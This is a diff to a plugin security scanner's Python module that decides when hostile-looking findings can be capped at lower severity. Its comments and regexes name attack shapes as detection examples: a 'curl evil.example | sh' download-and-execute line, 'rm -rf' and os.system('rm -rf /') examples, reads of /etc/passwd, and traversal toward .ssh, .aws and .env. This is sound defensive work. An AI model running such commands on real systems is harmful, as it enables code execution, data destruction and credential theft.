@@ -90,7 +90,7 @@ def prose_cap(finding: Finding) -> Optional[str]:
 # ``curl_pipe_shell`` keeps full severity in prose because a README — and a CI workflow — is exactly
 # where a malicious download-and-execute one-liner would be planted (``curl evil.example | sh`` in a
 # ``.github/workflows`` step stays ``high``). The documented, non-attack shape is a pipe whose URL is a
-# NAMED trusted installer: Qubit's own ``install.sh``, a named upstream runtime (``ollama.com``,
+# NAMED trusted installer: Hermes' own ``install.sh``, a named upstream runtime (``ollama.com``,
 # ``bun.sh``, ``get.docker.com``, ``sh.rustup.rs`` …), a named dev-tool CLI (``app.factory.ai``), or a
 # GitHub ``raw`` URL whose path is an ``install`` script. That lands at medium (a note). An unpinned /
 # unknown third-party domain — the attack shape — keeps full severity, in README, code, OR CI.
@@ -150,20 +150,20 @@ def catalog_cap(finding: Finding) -> Optional[str]:
     return prose_cap(finding)
 
 
-# A README "Uninstall" section removing the plugin's OWN install directory under ``~/.qubit`` is the one
+# A README "Uninstall" section removing the plugin's OWN install directory under ``~/.hermes`` is the one
 # destructive shape that is harmless by construction: one ``rm``, every operand rooted at
-# ``$HOME``/``${HOME}``/``~`` + ``/.qubit/`` with a plain segment path and a plain leaf — no glob, no
+# ``$HOME``/``${HOME}``/``~`` + ``/.hermes/`` with a plain segment path and a plain leaf — no glob, no
 # ``..``, nothing chained. Documented shapes: ``plugins/<name>`` / ``skills/<name>``, a profile-scoped
 # ``profiles/<profile>/{plugins,roles,...}/<name>``, ``desktop-plugins/<name>``, and the plugin's own
-# data dir ``~/.qubit/<name>`` — and up to a few such operands on one line (``rm -rf ~/.qubit/profiles/N/plugins/crew
-# ~/.qubit/profiles/N/roles/crew``). It lands at medium (a note). A wider target (``$HOME``, ``$HOME/.qubit``,
-# ``$HOME/.qubit/plugins/*``) only gets the generic prose step (high, caution) and the same line in a ``.sh``
+# data dir ``~/.hermes/<name>`` — and up to a few such operands on one line (``rm -rf ~/.hermes/profiles/N/plugins/crew
+# ~/.hermes/profiles/N/roles/crew``). It lands at medium (a note). A wider target (``$HOME``, ``$HOME/.hermes``,
+# ``$HOME/.hermes/plugins/*``) only gets the generic prose step (high, caution) and the same line in a ``.sh``
 # stays critical (#115353).
-_UNINSTALL_HOME = r'(?:\$HOME|\$\{HOME\}|~)/\.(?:qubit|hermes)'
+_UNINSTALL_HOME = r'(?:\$HOME|\$\{HOME\}|~)/\.hermes'
 
 
 def _uninstall_operand(group: str) -> str:
-    """One ``~/.qubit/<segments>/<leaf>`` operand, optionally quoted (quote tracked by *group*)."""
+    """One ``~/.hermes/<segments>/<leaf>`` operand, optionally quoted (quote tracked by *group*)."""
     return (rf'(?P<{group}>["\']?)' + _UNINSTALL_HOME
             + rf'(?:/[A-Za-z0-9][A-Za-z0-9._-]*)+/?(?P={group})')
 
@@ -225,13 +225,6 @@ _EXEC_ON_LINE = re.compile(
 # Shell-like files keep the raw line: there ``"$(id)"`` executes inside double quotes.
 _QUOTES_NEVER_EXECUTE_SUFFIXES = {".py", ".pyi", ".js", ".mjs", ".cjs", ".jsx", ".ts", ".mts", ".cts", ".tsx"}
 
-
-def _executes(line: str, rel_path: str) -> bool:
-    if Path(rel_path).suffix.lower() in _QUOTES_NEVER_EXECUTE_SUFFIXES:
-        line = _LITERAL_SPANS.sub(lambda m: m.group(0)[0] + " " * (len(m.group(0)) - 2) + m.group(0)[-1], line)
-    return _EXEC_ON_LINE.search(line) is not None
-
-
 # An exec call whose FIRST argument is a string literal runs that literal: ``os.system('rm -rf /')``,
 # ``open('/etc/passwd')``, ``exec("code")``. A test dispatcher that passes the hostile string as a
 # LATER argument or nested in a dict — ``call(core.detail, "/etc/passwd")``, ``call('read_file',
@@ -251,6 +244,12 @@ def _exec_first_arg_literal_spans(line: str, spans: list[tuple[int, int]]) -> li
         if span is not None:
             out.append(span)
     return out
+
+
+def _executes(line: str, rel_path: str) -> bool:
+    if Path(rel_path).suffix.lower() in _QUOTES_NEVER_EXECUTE_SUFFIXES:
+        line = _LITERAL_SPANS.sub(lambda m: m.group(0)[0] + " " * (len(m.group(0)) - 2) + m.group(0)[-1], line)
+    return _EXEC_ON_LINE.search(line) is not None
 
 
 def is_inert_fixture_line(finding: Finding, line: str, is_code: bool, rel_path: str = "") -> bool:
@@ -500,7 +499,7 @@ def is_quoted_injection_phrase(finding: Finding, line: str) -> bool:
 # keeps full severity.
 _TRAVERSAL_RUN = re.compile(r"(?:\.\./)+\.\.")
 _SENSITIVE_AFTER_TRAVERSAL = re.compile(
-    r"(?:/|\\)*(?:etc\b|passwd\b|shadow\b|\.ssh\b|\.aws\b|\.env\b|\.qubit\b|\.hermes\b|\.gnupg\b|\.kube\b"
+    r"(?:/|\\)*(?:etc\b|passwd\b|shadow\b|\.ssh\b|\.aws\b|\.env\b|\.hermes\b|\.gnupg\b|\.kube\b"
     r"|\.docker\b|\.netrc\b|\.npmrc\b|\.pypirc\b|\.config\b|proc\b|root\b|home\b|var\b|usr\b|sys\b)",
     re.IGNORECASE)
 
@@ -594,21 +593,6 @@ def is_authorized_keys_prose(finding: Finding, line: str, is_doc: bool) -> bool:
         return False
     return any(a <= pos and pos + len("authorized_keys") <= b for a, b in
                (m.span() for m in _LITERAL_SPANS.finditer(line)))
-
-
-# ── (6) base64 decode piped to a non-interpreter ────────────────────────────────────────────
-# ``base64_decode_pipe`` describes "decodes and pipes to execution". ``gh api … | base64 -d |
-# grep '^sha:'`` decodes data for a text filter; the shape is only execution when the consumer
-# is a shell/interpreter or ``eval``/``source``/``exec``. A data consumer steps down to medium.
-_DECODE_CONSUMER = re.compile(r"base64\s+(?:-d|--decode)\s*\|\s*(?:\w+=\S*\s+)*(?:\S*/)?(?P<cmd>[A-Za-z0-9_.+-]+)")
-_INTERPRETERS = re.compile(r"^(?:sh|bash|zsh|dash|ksh|fish|python[\d.]*|perl|ruby|node|nodejs|php|eval|source|exec|xargs|env|sudo)$")
-
-
-def is_data_decode(line: str) -> bool:
-    """``base64 -d`` whose pipe target is a non-interpreter command (grep, jq, tee, tar …)."""
-    m = _DECODE_CONSUMER.search(line)
-    return m is not None and _INTERPRETERS.match(m.group("cmd")) is None
-
 
 # ── (7) loopback address with port ───────────────────────────────────────────────────────────
 # ``hardcoded_ip_port`` is the "network" family's egress tripwire, yet ``127.0.0.1:12306`` in a
@@ -776,16 +760,45 @@ def is_coin_name_only(finding: Finding, line: str) -> bool:
     return bool(hits) and all(_is_standalone_coin_name(line, h.start(), h.end()) for h in hits)
 
 
-# Google mints installed-app (desktop/CLI) OAuth clients with a ``GOCSPX-`` secret that its OAuth
-# docs say cannot be kept confidential: every copy of the app ships it (gcloud does). A plugin is
-# such an app, so the literal identifies a public client rather than leaking a credential; it stays
-# in the report for review (caution) instead of hard-blocking the install.
-_GOOGLE_PUBLIC_CLIENT_SECRET = re.compile(r'["\']GOCSPX-[A-Za-z0-9_-]{20,}["\']')
+# Key shapes the vendor documents as public, shipped in every copy of a client: a Google
+# installed-app (desktop/CLI) OAuth client secret (``GOCSPX-``, gcloud ships one) and a PostHog
+# project API key (``phc_``, a write-only ingest key every web page embeds). The literal identifies
+# a client rather than leaking a credential, so it stays in the report for review (caution) instead
+# of hard-blocking the install. Only when EVERY ``hardcoded_secret`` literal on the line has one of
+# these prefixes: a PostHog personal key (``phx_``) or any other token beside it keeps critical.
+_PUBLIC_CLIENT_KEY_PREFIXES = ("GOCSPX-", "phc_")
+_SECRET_LITERAL = re.compile(r'[=:]\s*["\']([A-Za-z0-9+/=_-]{20,})')
 
 
-def is_google_installed_app_secret(finding: Finding, line: str) -> bool:
-    """A ``hardcoded_secret`` hit whose literal is a Google installed-app OAuth client secret."""
-    return finding.pattern_id == "hardcoded_secret" and bool(_GOOGLE_PUBLIC_CLIENT_SECRET.search(line))
+def is_public_client_key(finding: Finding, line: str) -> bool:
+    """A ``hardcoded_secret`` hit whose every matched literal is a public-by-design client key."""
+    if finding.pattern_id != "hardcoded_secret":
+        return False
+    literals = [_SECRET_LITERAL.search(m.group(0)) for m in _PATTERN_BY_ID["hardcoded_secret"].finditer(line)]
+    return bool(literals) and all(
+        lit is not None and lit.group(1).startswith(_PUBLIC_CLIENT_KEY_PREFIXES) for lit in literals)
+
+
+# ``/proc/self/<leaf>`` and ``/proc/<pid>/<leaf>`` files that describe scheduling and container
+# placement (cgroup membership, mount layout, start time in ``stat``, limits): container CPU-quota
+# detection and pid-reuse checks read them. A read of one of these is not process introspection.
+# The leaves that leak or reach another process keep ``high``: ``environ``, ``cmdline``, ``mem``,
+# ``maps``, ``fd``, ``root``/``cwd`` (procfs escape into the host tree), ``exe``, ``ns`` and any
+# leaf not listed, as do a bare ``/proc/self`` and any write.
+_BENIGN_PROC_LEAVES = frozenset({
+    "cgroup", "mountinfo", "mounts", "stat", "statm", "status", "limits", "io", "comm", "cpuset",
+    "sched", "schedstat", "oom_score"})
+_PROC_PATH = re.compile(r"/proc/(?:self|\d+)(?:/([\w.-]*))?")
+_PROC_WRITE = re.compile(
+    r"write_text|write_bytes|\.write\s*\(|open\s*\([^)\n]{0,300}?['\"][rbt]*[wax+][rbt+]*['\"]|O_WRONLY|O_RDWR|>\s*['\"]?/proc/|\btee\b")
+
+
+def is_own_proc_read(finding: Finding, line: str) -> bool:
+    """A ``proc_access`` hit where every ``/proc`` path on the line is a benign leaf, read only."""
+    if finding.pattern_id != "proc_access":
+        return False
+    leaves = [m.group(1) for m in _PROC_PATH.finditer(line)]
+    return bool(leaves) and all(leaf in _BENIGN_PROC_LEAVES for leaf in leaves) and not _PROC_WRITE.search(line)
 
 
 __all__ = [
@@ -800,17 +813,17 @@ __all__ = [
     "is_benign_lazy_os_import",
     "is_ci_workflow",
     "is_coin_name_only",
-    "is_data_decode",
     "is_disclosed_config_note",
     "is_doc_prose",
     "is_env_dump_in_safety_clause",
-    "is_google_installed_app_secret",
     "is_hex_in_char_class",
     "is_inert_fixture_line",
     "is_json_prose_value",
     "is_loopback_continuation",
     "is_loopback_only",
+    "is_own_proc_read",
     "is_pip_install_in_prose_literal",
+    "is_public_client_key",
     "is_quoted_injection_phrase",
     "is_regex_alternation_token",
     "is_repo_root_traversal",
@@ -821,3 +834,19 @@ __all__ = [
     "logical_line",
     "prose_cap",
 ]
+
+
+# Google mints installed-app (desktop/CLI) OAuth clients with a ``GOCSPX-`` secret that its OAuth
+# docs say cannot be kept confidential: every copy of the app ships it (gcloud does). A plugin is
+# such an app, so the literal identifies a public client rather than leaking a credential; it stays
+# in the report for review (caution) instead of hard-blocking the install.
+_GOOGLE_PUBLIC_CLIENT_SECRET = re.compile(r'["\']GOCSPX-[A-Za-z0-9_-]{20,}["\']')
+
+
+def is_google_installed_app_secret(finding: Finding, line: str) -> bool:
+    """A ``hardcoded_secret`` hit whose literal is a Google installed-app OAuth client secret."""
+    return finding.pattern_id == "hardcoded_secret" and bool(_GOOGLE_PUBLIC_CLIENT_SECRET.search(line))
+
+
+if "is_google_installed_app_secret" not in __all__:
+    __all__.append("is_google_installed_app_secret")
